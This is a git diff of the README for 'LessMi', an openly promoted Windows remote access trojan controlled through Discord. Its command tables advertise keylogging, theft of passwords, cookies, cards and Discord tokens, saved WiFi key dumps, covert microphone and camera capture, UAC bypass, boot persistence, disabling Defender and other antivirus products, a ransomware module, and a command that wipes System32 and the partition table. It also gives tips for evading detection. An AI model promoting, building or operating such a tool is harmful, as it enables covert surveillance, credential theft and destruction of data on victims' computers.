@@ -3,7 +3,7 @@
 # LessMi RAT
 # [Download](https://github.com/MateAGYT/LessMi/releases)
 
-**An advanced, lightweight, open-source Windows RAT written in Python, controlled entirely through Discord — with a one-click panel, simple commands, and painless installation.**
+**An advanced, open-source Windows RAT written in Python, controlled entirely through Discord — with a one-click panel, simple commands, and painless installation.**
 
 <img src="https://files.catbox.moe/vuhaid.png" width="500" />
 
@@ -15,7 +15,7 @@ Join our Telegram community to stay tuned of the last changes and support us!<br
 ![Control](https://img.shields.io/badge/control-Discord-5865F2?logo=discord&logoColor=white)
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![Status](https://img.shields.io/badge/status-active-brightgreen)
-![Commands](https://img.shields.io/badge/commands-100%2B-orange)
+![Commands](https://img.shields.io/badge/commands-200%2B-orange)
 ![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)
 
 > **`MateAGYT/LessMi` is the ONLY official repository.** Don't install or run any other repo claiming to be us, or an "advanced/paid" version!
@@ -30,10 +30,14 @@ Join our Telegram community to stay tuned of the last changes and support us!<br
 - [2. Disclaimer & license](#-disclaimer--license)
 - [3. Features](#️-features)
   - [Surveillance & media](#-surveillance--media)
+  - [Display, theme & appearance](#-display-theme--appearance)
   - [Input & hardware control](#️-input--hardware-control)
   - [System & process control](#️-system--process-control)
+  - [Hardware & system inventory](#-hardware--system-inventory)
   - [Filesystem](#-filesystem)
   - [Network & persistence](#-network--persistence)
+  - [Network diagnostics](#-network-diagnostics)
+  - [Security & policy toggles](#-security--policy-toggles)
   - [Trolling & pranks](#-trolling--pranks)
   - [Remote shell](#-remote-shell)
   - [Power & destructive](#-power--destructive)
@@ -54,7 +58,7 @@ Join our Telegram community to stay tuned of the last changes and support us!<br
 
 **LessMi** is a lightweight, fully-featured Remote Administration Tool for **Windows**, written in **Python** and commanded from a **Discord bot**. There is no ugly GUI client to keep open — your "control panel" is Discord itself, so you can manage one machine or a whole fleet of them from your phone, laptop, or a friend's PC.
 
-It ships with an **interactive button panel**, so beginners can click instead of memorizing commands, while power users get the full command-line speed. Type `.help` at any time to get the full command list dumped straight into Discord.
+It ships with an **interactive button panel** covering screenshots, system control, devices, processes, trolling, files, security, power, info and tools, so beginners can click instead of memorizing commands, while power users get the full command-line speed. Type `.help` at any time to open the category menu with every command dumped straight into Discord.
 
 LessMi is a modern, actively-maintained fork and spiritual successor to **PySilon** — a project that is now effectively **abandoned** — rebuilt with more features, more stability, and a proper install flow.
 
@@ -70,7 +74,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 
 # ⚙️ Features
 
-> Commands use the `.` prefix. Run `.help` to list everything in-channel.
+> Commands use the `.` prefix. Run `.help` to list everything in-channel, by category.
 
 ## 🎥 Surveillance & media
 
@@ -79,13 +83,31 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.ss` | Screenshot **all** connected monitors. |
 | `.screenrec <seconds>` | Record the screen for a chosen duration. |
 | `.webcam` | Capture a picture from the webcam. |
+| `.camrec <seconds>` | Record video from the selected camera. |
 | `.list-cams` / `.sel-cam <id>` | List cameras and pick the default one for `.webcam`. |
 | `.list-mics` / `.sel-mic <id>` | List microphones and pick the default one for `.join`. |
 | `.join` / `.disconnect` | Join the **live microphone feed** 24/7, or leave it. |
 | `.record <seconds>` / `.mic-record <seconds>` | Instantly record the mic and send the clip. |
 | `.show-screens` / `.screen-mode <mode>` | List monitors and change the screen layout. |
+| `.resolution <w> <h>` | Force a display resolution. |
 | `.list-speakers` / `.set-speaker <n>` | List audio outputs and switch the active speaker. |
 | `.screensaver` | Start the screensaver. |
+| `.magnifier` | Open the Windows Magnifier. |
+| `.open-cd` | Eject the optical drive. |
+
+## 🎨 Display, theme & appearance
+
+| Command | What it does |
+|---|---|
+| `.monitors-on` / `.monitors-off` | Power the displays on or off. |
+| `.rotate <0\|90\|180\|270>` | Rotate the screen orientation. |
+| `.dark-mode <on\|off>` | Toggle Windows dark mode. |
+| `.night-light <on\|off>` | Toggle Night Light. |
+| `.invert` | Invert all screen colors for 10 seconds. |
+| `.set-wallpaper <file\|url>` / `.wallpaper-random` | Change the wallpaper to a file, URL or a random stock image. |
+| `.accent <name\|#hex>` | Change the bot's embed accent color. |
+| `.taskbar <hide\|show>` | Hide or show the taskbar. |
+| `.desktop-icons <hide\|show>` | Hide or show desktop icons. |
 
 ## 🖱️ Input & hardware control
 
@@ -96,29 +118,33 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.show-cursor` / `.hide-cursor` | Show or hide the cursor. |
 | `.crazy-mouse` | Jiggle the mouse randomly for 2 seconds. |
 | `.key <keys>` | Press keys — supports tokens like `[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`. |
+| `.click [n]` | Send N left clicks. |
+| `.click-delete [n] [folder]` | Delete a random file per click. |
+| `.autoclick <on\|off> [interval]` | Continuous auto-clicker. |
+| `.mouse-speed <1-20>` / `.swap-mouse <on\|off>` | Pointer speed and left/right swap. |
 | `.alt-f4` | Send ALT+F4 to the active window. |
-| `.monitors-on` / `.monitors-off` | Power the displays on or off. |
-| `.rotate <0/90/80/270>` | Rotate the screen orientation. |
-| `.volume <0-100>` | Set the system volume. |
+| `.volume <0-100>` / `.vol-step <up\|down> [n]` | Set or step the system volume. |
 | `.mute` | Mute system audio. |
-| `.airplane-mode <on/off>` | Toggle airplane mode. |
-| `.taskbar <hide/show>` | Hide or show the taskbar. |
-| `.desktop-icons <hide/show>` | Hide or show desktop icons. |
+| `.airplane-mode <on\|off>` | Toggle airplane mode. |
+| `.bluetooth <on\|off>` | Toggle Bluetooth radios. |
+| `.capslock` / `.numlock` / `.scrolllock` `<on\|off>` | Force lock-key states. |
+| `.sticky-keys <on\|off>` | Toggle Sticky Keys. |
+| `.unpin-all` / `.restart-taskbar` | Clear taskbar pins, restart explorer. |
+| `.enable-device <n>` / `.disable-device <n>` | Manage hardware devices. |
 
 ## 🖥️ System & process control
 
 | Command | What it does |
 |---|---|
 | `.tasklist` | List running processes. |
-| `.taskkill <process>` | Kill a process by name. |
+| `.proc-info <name>` | Details of a process (path, user, RAM). |
+| `.taskkill <process>` / `.kill-tree <process>` | Kill a process, or it and all children. |
 | `.kill-explorer` / `.start-explorer` | Kill/restart `explorer.exe` (black screen when stopped). |
 | `.disable-taskmgr` / `.enable-taskmgr` | Toggle Task Manager. |
 | `.disable-cmd` / `.enable-cmd` | Toggle Command Prompt. |
-| `.disable-defender` / `.enable-defender` | Toggle Windows Defender. |
 | `.disable-reagentc` / `.enable-reagentc` | Toggle ReAgentC (recovery). |
 | `.set-critical` / `.unset-critical` | Mark the process critical (BSOD on terminate). |
 | `.blacklist <proc>` / `.unblacklist <proc>` | Block a process from running. |
-| `.enable-device <n>` / `.disable-device <n>` | Manage hardware devices. |
 | `.idle-time` | Report how long the user has been idle. |
 | `.set-date <date>` / `.set-hour <time>` | Change system date/time. |
 | `.deactivate-windows` | Deactivate Windows. |
@@ -130,6 +156,21 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.clipboard` / `.set-clipboard <text>` | Read or set the clipboard. |
 | `.beep` | Emit a system beep. |
 | `.notepad [text]` | Open Notepad (optionally pre-filled). |
+| `.god-mode` | Create a GodMode folder on the desktop. |
+| `.restore-point` | Create a System Restore checkpoint. |
+
+## 🔬 Hardware & system inventory
+
+| Command | What it does |
+|---|---|
+| `.sysinfo` / `.systeminfo` | Live CPU/RAM/disk usage, and the raw `systeminfo` dump. |
+| `.gpu` / `.cpu` / `.motherboard` / `.bios` | GPU, CPU, baseboard and BIOS details. |
+| `.disks` / `.volumes` / `.partition` | Physical disks, volumes and partitions. |
+| `.drives` / `.battery` / `.uptime` / `.sysclock` | Drives, battery, uptime and system clock. |
+| `.temp` | Thermal zone temperatures. |
+| `.whoami` / `.env` / `.sessions` / `.users` | Identity, environment, sessions, local accounts. |
+| `.hotfix` / `.antivirus` / `.drivers` / `.events` | Hotfixes, registered AV, drivers, event log. |
+| `.wifi` | Dump every saved WiFi profile with its key. |
 
 ## 📁 Filesystem
 
@@ -138,11 +179,19 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.ls` | List the current directory and files. |
 | `.cd <path>` | Change directory. |
 | `.tree` | Print the directory tree. |
+| `.cat <file>` | Read a text file. |
+| `.mkdir <name>` / `.mkfile <name> <text>` | Create a folder or a text file. |
+| `.move <a> <b>` / `.copy <a> <b>` / `.rename <a> <b>` | Move, copy or rename. |
+| `.size <path>` / `.hash <file>` | Path size, SHA256 hash. |
+| `.search <pattern> [path]` | Search filenames recursively. |
+| `.zip <src> <dest>` / `.unzip <file>` | Archive or extract. |
 | `.download <file>` | Upload a file from the target to Discord. |
 | `.upload` | Push an attached file to the target. |
 | `.grab-url <url> [dest]` | Download a file straight from a URL. |
 | `.remove <file>` | Permanently delete a file or folder. |
-| `.open <file>` | Open or execute a file. |
+| `.open <file>` / `.run <file>` | Open or execute a file. |
+| `.recent` / `.usb` | Recently opened files, USB history. |
+| `.empty-temp` / `.hosts` | Wipe temp folders, read the hosts file. |
 | `.mount-iso <file>` / `.unmount-iso <file>` | Mount or unmount an ISO. |
 
 ## 🌐 Network & persistence
@@ -151,6 +200,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 |---|---|
 | `.ip-locate` | Geolocate the target by IP. |
 | `.coords` | Fetch GPS / IP-based coordinates + a Maps link. |
+| `.public-ip` | Report the public IP. |
 | `.speedtest` | Run an internet speed test. |
 | `.block-domain <d>` / `.unblock-domain <d>` | Block/unblock a domain. |
 | `.block-website <url>` / `.unblock-website <url>` | Block/unblock a website. |
@@ -160,6 +210,29 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.ask-admin` | Request admin via a UAC prompt. |
 | `.uac-bypass` | Attempt a UAC bypass for elevation. |
 | *(startup)* | **Persistence + UAC bypass at boot**, out of the box. |
+
+## 📡 Network diagnostics
+
+| Command | What it does |
+|---|---|
+| `.ping [host]` / `.tracert [host]` | ICMP echo and route tracing. |
+| `.nslookup <host>` | DNS resolution. |
+| `.netstat` / `.ports` | All sockets, and listening ports only. |
+| `.arp` / `.route` | ARP table, IPv4 routing table. |
+| `.flush-dns` / `.renew-ip` | Flush DNS cache, release + renew the lease. |
+| `.net-adapter` | Adapter list with link speed and status. |
+| `.wifi-networks` | Nearby WiFi networks with BSSIDs. |
+| `.shares` | SMB shares. |
+
+## 🛡️ Security & policy toggles
+
+| Command | What it does |
+|---|---|
+| `.disable-defender` / `.enable-defender` | Toggle Windows Defender real-time protection. |
+| `.purge-av` | Add exclusions and disable third-party AV services (Avast, Kaspersky, ESET, Bitdefender, etc.). |
+| `.firewall <on\|off>` | Toggle all firewall profiles. |
+| `.bitlocker` | BitLocker volume status. |
+| `.hibernate <on\|off>` / `.fastboot <on\|off>` | Hibernate and Fast Startup. |
 
 ## 🎭 Trolling & pranks
 
@@ -171,7 +244,6 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | `.display-glitch [graphic]` | Overlay a glitch graphic (shows help if none given). |
 | `.play <file/url>` | Play audio from a file or URL. |
 | `.tts <message>` | Speak your message out loud. |
-| `.set-wallpaper <name_or_URL>` | Change the wallpaper. |
 | `.minimize-all` | Minimize every window. |
 | `.forkbomb` | Spawn processes until the PC chokes. |
 | `.bsod` | Trigger a Blue Screen of Death. |
@@ -189,7 +261,9 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 
 | Command | What it does |
 |---|---|
-| `.kill-pc` → `.confirm-kill` | Delete/rename the bootloader + key files → **unbootable** (cannot be undone). |
+| `.lock-pc` / `.sleep-pc` | Lock the workstation, send it to sleep. |
+| `.restart-pc` / `.shutdown-pc` | Restart or shut down. |
+| `.kill-pc` → `.confirm-kill` | Purge AV, kill recovery, delete the BCD store, wipe user data + System32, nuke the partition table → **unbootable** (cannot be undone). |
 | `.implode` | Self-destruct, leaving no evidence. |
 | `.exit` | Close the RAT until reboot or forced reopen. |
 | `.update` | Push a newer compiled build via an attached file. |
@@ -198,10 +272,13 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 
 | Command | What it does |
 |---|---|
-| `.help` | Dump the full command reference (3 embeds). |
+| `.help` | Open the category menu with the full command reference. |
 | `.keylogger-enable` / `.keylogger-disable` | Toggle the keylogger. |
 | `.keylog` | Flush the keylog buffer to `#keys` immediately. |
 | `.take all` | Grab **passwords, Discord tokens, browser history, cookies, and IP** in one shot. |
+| `.take <mode>` | Single-mode grab: `cookies`, `history`, `cards`, `games`, `discord`, `passwords`, `vm`. |
+| `.grabber [url]` | Fetch and run the grabber standalone. |
+| `.discord-diag` | Diagnostic dump of Discord installs and tokens. |
 | `.leave-all` | Make the bot leave every server it's in. |
 | `.clean` | Clear all channels. |
 
@@ -213,6 +290,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 - **Discord-native control** — manage machines from any device that runs Discord.
 - **Button panel + commands** — friendly for beginners, fast for pros.
 - **Batteries included** — persistence, UAC bypass, keylogger, **working grabber**, live mic, and self-destruct all built in.
+- **Real inventory** — WMI hardware, security posture, network diagnostics and event logs, not just a tasklist.
 - **Active** — maintained by a single dedicated author, unlike its abandoned ancestors.
 - **Honest about lineage** — based on PySilon, rebuilt and extended.
 
@@ -220,7 +298,7 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 
 # 📊 Comparison with other RATs
 
-> `✅` Full · `🟡` Partial/paused/plugin · `❌` None · `💀` Abandoned · `⚠️` Paid/limited
+> `✅` full · `🟡` partial/plugin · `❌` none · `💀` abandoned · `⚠️` paid/limited
 
 | Feature / RAT | **LessMi** | PySilon | QuasarRAT | AsyncRAT | Venom RAT | NanoCore | njRAT |
 |---|---|---|---|---|---|---|---|
@@ -238,14 +316,24 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 | Live microphone | **✅** | ✅ | ❌ | ❌ | 🟡 | 🟡 | ❌ |
 | Keylogger | **✅** | ✅ | 🟡 | ✅ | ✅ | ✅ | ✅ |
 | Webcam | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | ✅ |
+| Camera video recording | **✅** | ❌ | 🟡 | ❌ | 🟡 | ❌ | ❌ |
 | Multi-monitor screenshot | **✅** | ✅ | ✅ | 🟡 | ✅ | ✅ | 🟡 |
 | File manager (download/upload) | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
 | Remote shell | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
 | Ransomware module | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
 | Grabber (`take all`) | **✅** | ✅ | 🟡 | 🟡 | ✅ | ✅ | 🟡 |
 | Trolling / pranks | **✅ Rich** | 🟡 | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
-| Display control (rotate/mode) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
+| Display control (rotate/mode/resolution) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
+| Theme control (dark mode/night light/invert) | **✅** | ❌ | 🟡 | ❌ | ❌ | 🟡 | ❌ |
+| Accent / embed theming | **✅** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
+| Auto-clicker + click-to-delete | **✅** | ❌ | 🟡 | ❌ | 🟡 | 🟡 | 🟡 |
 | Clipboard access | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | ✅ | ✅ |
+| Hardware inventory (WMI) | **✅** | 🟡 | ✅ | 🟡 | 🟡 | 🟡 | 🟡 |
+| Network diagnostics (ping/tracert/netstat) | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
+| Firewall / BitLocker / policy toggles | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
+| AV purge + Defender exclusion | **✅** | 🟡 | ❌ | ❌ | 🟡 | ❌ | ❌ |
+| Device enable/disable | **✅** | ❌ | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
+| File hashing / zip / search | **✅** | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 | 🟡 |
 | Multiple PCs at once | **✅** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
 | No GUI to keep open | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
 | Works over mobile Discord | **✅** | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
@@ -302,9 +390,9 @@ LessMi is a modern, actively-maintained fork and spiritual successor to **PySilo
 Check that **Message Content Intent** is enabled, the token is correct, and the bot can read/send in the target channel.
 
 **Windows Defender / SmartScreen flags it.**
-Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*.
+Normal for a fresh, unsigned RAT. Add an exclusion folder, or sign the binary. First-run may also need *"More info → Run anyway"*. Once running, `.purge-av` adds exclusions and silences the usual suspects.
 
-**`.webcam` / `.join` fails.**
+**`.webcam` / `.camrec` / `.join` fails.**
 Confirm a camera/mic exists and is selected via `.list-cams` / `.sel-cam` and `.list-mics` / `.sel-mic`. Some virtual devices misreport — pick a physical one.
 
 **`.admin-check` says no admin.**
@@ -312,6 +400,12 @@ Run the build elevated, use `.ask-admin`, or try `.uac-bypass`.
 
 **`.take all` opens consoles but sends nothing.**
 Make sure the `resources/` scripts exist alongside the build, and that the target has `python` available for the sub-scripts. Output is written to fresh consoles on the target.
+
+**`.take`/`.grabber` reports a missing `grab.py`.**
+The build normally fetches it on demand — check connectivity to GitHub, or drop `grab.py` into `resources/` manually.
+
+**`.resolution` / `.rotate` blanked the screen.**
+A mode the panel doesn't support got applied. Reboot, or set a known-good resolution back with `.resolution 1920 1080`.
 
 **Compile fails on dependencies.**
 Update `pip` (`python -m pip install --upgrade pip`) and re-run the `.bat`. Ensure you're on a real Windows machine, not Wine.
@@ -327,22 +421,25 @@ Windows only. macOS/Linux are not supported (yet).
 # 🗺️ Roadmap
 
 - [ ] **Slash commands** — clone every prefix command as a slash command.
-- [x] Restore the **`take all` grabber** module.
+- [x] ~~Restore the **`take all` grabber** module.~~ ✅ **Done — fully available.**
 - [ ] Even more commands (always).
 - [ ] Signed release binaries to reduce AV false positives.
 - [ ] Optional multi-bot sharding for large fleets.
+- [ ] Persisted per-machine command history and scheduled jobs.
 
 ---
 
 # 🦠 VirusTotal analysis
 
 <div align="center">
-  <a href="https://www.virustotal.com/gui/file/308057154e8b90386b101c4b317ef2f14526fbd9a52429db8cb96cf200bd1fe1?nocache=1">
+  <a href="https://www.virustotal.com/gui/file-analysis/ZGQ4MDA4NjZiYmNlYzhhOTNhZDExM2Y0MDEyMzkzYTU6MTc5MzMxMzc3MQ==?nocache=1">
     <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/b/b7/VirusTotal_logo.svg/1280px-VirusTotal_logo.svg.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="VirusTotal Analysis" height="80" />
   </a>
   <br />
-  <sub>0/61 detections — <a href="https://www.virustotal.com/gui/file/308057154e8b90386b101c4b317ef2f14526fbd9a52429db8cb96cf200bd1fe1?nocache=1">See the full report in VirusTotal.</a></sub>
+  <sub>9/59 detections — <a href="https://www.virustotal.com/gui/file-analysis/ZGQ4MDA4NjZiYmNlYzhhOTNhZDExM2Y0MDEyMzkzYTU6MTc5MzMxMzc3MQ==?nocache=1">See the full report in VirusTotal.</a></sub>
 </div>
+
+---
 
 # 🙏 Credits
 
